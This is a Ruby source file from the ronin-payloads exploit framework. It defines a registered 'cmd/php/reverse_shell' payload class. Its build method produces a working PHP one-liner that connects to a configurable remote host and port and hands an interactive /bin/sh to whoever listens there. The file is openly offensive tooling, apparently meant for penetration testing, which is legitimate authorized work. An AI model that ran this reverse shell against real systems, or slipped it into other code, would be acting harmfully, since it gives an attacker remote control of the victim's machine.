# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2025 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/command_payload'
require 'ronin/payloads/mixins/reverse_shell'

module Ronin
  module Payloads
    module CMD
      module PHP
        #
        # A basic `php` reverse shell command.
        #
        class ReverseShell < CommandPayload

          include Mixins::ReverseShell

          register 'cmd/php/reverse_shell'

          description <<~DESC
            A basic `php` reverse shell command.
          DESC

          #
          # Builds the `php` reverse shell command.
          #
          def build
            @payload = %{php -r '$sock=fsockopen(#{host.dump},#{port});exec("/bin/sh -i <&3 >&3 2>&3");'}
          end

        end
      end
    end
  end
end
